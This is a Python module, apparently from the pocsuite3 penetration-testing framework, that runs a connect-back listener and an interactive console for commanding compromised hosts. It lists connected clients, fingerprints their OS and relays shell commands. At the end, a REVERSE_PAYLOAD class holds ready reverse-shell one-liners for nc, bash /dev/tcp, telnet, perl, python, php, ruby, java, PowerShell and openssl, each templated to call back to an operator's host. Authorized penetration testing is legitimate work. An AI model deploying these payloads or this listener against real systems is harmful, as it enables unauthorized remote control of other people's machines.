import select
import socket
import threading
import time
import os
from pocsuite3.lib.utils import gen_cert
from pocsuite3.lib.core.common import data_to_stdout, has_poll, get_unicode, desensitization
from pocsuite3.lib.core.data import conf, kb, logger, paths
from pocsuite3.lib.core.datatype import AttribDict
from pocsuite3.lib.core.enums import AUTOCOMPLETE_TYPE, OS, CUSTOM_LOGGING
from pocsuite3.lib.core.exception import PocsuiteShellQuitException
from pocsuite3.lib.core.settings import DEFAULT_LISTENER_PORT
from pocsuite3.lib.core.shell import auto_completion, clear_history, save_history, load_history
from pocsuite3.lib.core.threads import exception_handled_function


def get_sock_listener(listen_port, listen_host="0.0.0.0", ipv6=False, protocol=None):
    if protocol in [None, "TCP"]:
        protocol = socket.SOCK_STREAM
    elif protocol in ["UDP"]:
        protocol = socket.SOCK_DGRAM

    if ipv6:
        s = socket.socket(socket.AF_INET6, protocol)
        if listen_host == "0.0.0.0":
            listen_host = "::"
    else:
        s = socket.socket(socket.AF_INET, protocol)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    msg = ''
    if conf.enable_tls_listener and protocol == socket.SOCK_STREAM:
        import ssl
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        cert_path = os.path.join(paths.POCSUITE_TMP_PATH, 'cacert.pem')
        gen_cert(filepath=cert_path)
        context.load_cert_chain(cert_path)
        s = context.wrap_socket(s, server_side=True)
        msg = 'TLS '
    try:
        s.bind((listen_host, listen_port))
    except socket.error:
        s.close()
        if conf.connect_back_host in kb.data.local_ips:
            logger.warn(f'unable to listen on {listen_host}:{listen_port}, check if the port is occupied.')
        return None

    if protocol == socket.SOCK_STREAM:
        msg += "listening on {0}:{1}".format(listen_host, listen_port)
        logger.log(CUSTOM_LOGGING.SYSINFO, msg)
        s.listen(5)
    return s


def get_udp_listener(listen_port=DEFAULT_LISTENER_PORT, listen_host="0.0.0.0", ipv6=False):
    return get_sock_listener(listen_port, listen_host, ipv6, "UDP")


def get_tcp_listener(listen_port=DEFAULT_LISTENER_PORT, listen_host="0.0.0.0", ipv6=False):
    return get_sock_listener(listen_port, listen_host, ipv6, "TCP")


def start_listener():
    t = threading.Thread(target=exception_handled_function, name="listener-thread", args=[listener_worker])
    t.setDaemon(True)
    t.start()


def listener_worker():
    s = get_tcp_listener(ipv6=conf.ipv6, listen_port=int(conf.connect_back_port))
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            client = AttribDict()
            client.conn = conn
            client.address = address
            kb.data.clients.append(client)
            info_msg = "new connection established from {0}".format(
                desensitization(address[0]) if conf.ppt else address[0])
            logger.log(CUSTOM_LOGGING.SUCCESS, info_msg)
        except Exception:
            pass


def list_clients():
    results = ''
    # https://en.wikipedia.org/wiki/Uname
    # https://en.wikipedia.org/wiki/Ver_(command)
    os_fingerprint = {
        'Linux': ['Linux', 'GNU'],
        'macOS': ['Darwin'],
        'Windows': ['Windows', 'PS ', 'C:\\', 'CYGWIN', 'MS-DOS', 'MSYS_NT', 'cmdlet'],
        'BSD': ['FreeBSD', 'OpenBSD', 'NetBSD', 'MidnightBSD'],
        'Solaris': ['SunOS']
    }
    for i, client in enumerate(kb.data.clients):
        try:
            client.conn.send(b'uname\nver\n')
            ret = poll_cmd_execute(client).lower()
            system, found = 'unknown', False
            for o, ks in os_fingerprint.items():
                if found:
                    break
                for k in ks:
                    if k.lower() in ret.lower():
                        system = o
                        found = True
                        break
        except Exception:  # If a connection fails, remove it
            del kb.data.clients[i]
            continue

        results += (f'{i}   ' + (desensitization(client.address[0]) if conf.ppt else str(client.address[0])) +
                    f'     ({system})\n')
    data_to_stdout("----- Remote Clients -----" + "\n" + results)


def get_client(cmd):
    try:
        target = cmd.split(" ")[1]
        target = int(target)
        client = kb.data.clients[target]  # Connect to the selected clients
        data_to_stdout("Now Connected: {0}\n".format(
            desensitization(client.address[0]) if conf.ppt else client.address[0]))
        return client
    except Exception:
        data_to_stdout("Invalid Client\n")
        return None


def send_shell_commands_for_console(client):
    module_prompt_default_template = (
        "\001\033[4m\002SHELL\001\033[0m\002 (\001\033[91m\002{hostname}\001\033[0m\002) > "
    )
    while True:
        cmd = None
        try:
            address = client.address[0]
            cmd = input(module_prompt_default_template.format(hostname=address))
            if not cmd:
                continue

            elif cmd.lower() == "clear":
                clear_history()
                data_to_stdout("[i] history cleared\n")

            elif cmd.lower() in ("x", "q", "exit", "quit", "bye"):
                break

            client.conn.send(str.encode(cmd + '\n'))

            resp = poll_cmd_execute(client)

            data_to_stdout(resp)

        except KeyboardInterrupt:
            logger.warn('Interrupt: use the \'quit\' command to quit')
            continue

        except Exception as ex:
            logger.error(str(ex))
            data_to_stdout("Connection Lost\n")
            break
    return True


def send_shell_commands(client):
    auto_completion(AUTOCOMPLETE_TYPE.OS, OS.LINUX)
    while True:
        cmd = None
        try:
            address = client.address[0]
            cmd = input("{0}>: ".format(desensitization(address) if conf.ppt else address))
            if not cmd:
                continue

            elif cmd.lower() == "clear":
                clear_history()
                data_to_stdout("[i] history cleared\n")
                save_history(AUTOCOMPLETE_TYPE.POCSUITE)

            elif cmd.lower() in ("x", "q", "exit", "quit", "bye"):
                break

            client.conn.send(str.encode(cmd + '\n'))

            resp = poll_cmd_execute(client)

            data_to_stdout(resp)

        except KeyboardInterrupt:
            logger.warn('Interrupt: use the \'quit\' command to quit')
            continue

        except Exception as ex:
            logger.error(str(ex))
            data_to_stdout("Connection Lost\n")
            break


def poll_cmd_execute(client, timeout=3):
    if has_poll():
        p = select.poll()
        event_in_mask = select.POLLIN | select.POLLPRI
        event_err_mask = select.POLLERR
        event_closed_mask = select.POLLHUP | select.POLLNVAL
        event_mask = event_in_mask | event_err_mask | event_closed_mask
        p.register(client.conn, event_mask)
        count = 0
        ret = ''
        read_again = True
        while True:
            events = p.poll(100)
            if events:
                event = events[0][1]
                if event & select.POLLERR:
                    ret = "Client Hung up\n"
                    break

                ready = event & select.POLLPRI or event & select.POLLIN
                if not ready:
                    ret = "execute command timeout\n"
                    break
                else:
                    time.sleep(0.05)
                    ret += get_unicode(client.conn.recv(65536))
            else:
                if ret:
                    if read_again:
                        read_again = False
                        continue
                    break
                elif count > timeout:
                    ret = "execute command timeout\n"
                    break
                else:
                    data_to_stdout(".")
                    read_again = False
                    time.sleep(1)
                    count += 1

        p.unregister(client.conn)
    else:
        count = 0
        ret = ''
        read_again = True
        while True:
            ready = select.select([client.conn], [], [], 0.1)
            if ready[0]:
                time.sleep(0.05)
                ret += get_unicode(client.conn.recv(65536))
            else:
                if ret:
                    if read_again:
                        read_again = False
                        continue
                    break
                elif count > timeout:
                    ret = "execute command timeout\n"
                else:
                    data_to_stdout('.')
                    read_again = False
                    time.sleep(1)
                    count += 1

    if ret and not ret.startswith('\r'):
        ret = "\r{0}".format(ret)
    if ret and not ret.endswith('\n'):
        ret = "{0}\n".format(ret)

    return ret


def print_cmd_help():
    msg = "-----   Help Menu  -----\n"
    msg += "command      description\n"
    msg += "list         list connected clients\n"
    msg += "select       select which client to send command\n"
    msg += "quit         quit shell\n"
    msg += "help         print help information\n"
    data_to_stdout(msg)


def handle_listener_connection_for_console(wait_time=3, try_count=3):
    while len(kb.data.clients) == 0:
        try:
            time.sleep(wait_time)
        except KeyboardInterrupt:
            break

    if len(kb.data.clients) > 0:
        cmd = "select 0"
        client = get_client(cmd)
        if client is not None:
            send_shell_commands_for_console(client)


def handle_listener_connection():
    _ = ["list", "select", "exit", "quit", "clear"]
    auto_completion(AUTOCOMPLETE_TYPE.POCSUITE, commands=_)

    while True:
        try:
            cmd = None
            cmd = input('shell>: ').strip()
            if not cmd:
                continue
            elif cmd.lower() in ("?", "help"):
                print_cmd_help()
            elif cmd.lower() == "clear":
                clear_history()
                data_to_stdout("[i] history cleared\n")
                save_history(AUTOCOMPLETE_TYPE.POCSUITE)
            elif cmd.lower() in ("x", "q", "exit", "quit"):
                raise PocsuiteShellQuitException
            elif cmd == "list":
                list_clients()
            elif cmd.lower().split(" ")[0] in ('select', 'use'):
                client = get_client(cmd)
                if client is not None:
                    send_shell_commands(client)
            else:
                save_history(AUTOCOMPLETE_TYPE.POCSUITE)
                load_history(AUTOCOMPLETE_TYPE.POCSUITE)
                data_to_stdout("Command Not Found... type ? for help.\n")

        except KeyboardInterrupt:
            logger.warn('Interrupt: use the \'quit\' command to quit')
            continue


class REVERSE_PAYLOAD:
    NC = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f"""
    NC2 = """nc -e /bin/sh {0} {1}"""
    NC3 = """rm -f /tmp/p;mknod /tmp/p p && nc {0} {1} 0/tmp/p"""
    BASH = """bash -c 'sh -i >& /dev/tcp/{0}/{1} 0>&1'"""
    BASH2 = """bash -c 'sh -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1'"""
    TELNET = """rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p"""
    PERL = (
        """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));"""
        """if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");"""
        """open(STDERR,">&S");exec("/bin/sh -i");}};'"""
    )
    PYTHON = (
        """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"""
        """s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"""
        """p=subprocess.call(["/bin/sh","-i"]);'"""
    )
    PHP = """php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'"""
    RUBY = """ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
    JAVA = (
        'r = Runtime.getRuntime()\n'
        'p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | '
        'while read line; do $line 2>&5 >&5; done"] as String[])\n'
        'p.waitFor()'
    )
    POWERSHELL = (
        '''$client = New-Object System.Net.Sockets.TCPClient('{0}',{1});$stream = $client.GetStream();'''
        '''[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'''
        '''{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'''
        '''$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';'''
        '''$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'''
        '''$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
    )
    OPENSSL = (
        'rm -rf /tmp/s;mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {0}:{1}>/tmp/s;'
        'rm -rf /tmp/s'
    )


if __name__ == "__main__":
    start_listener()
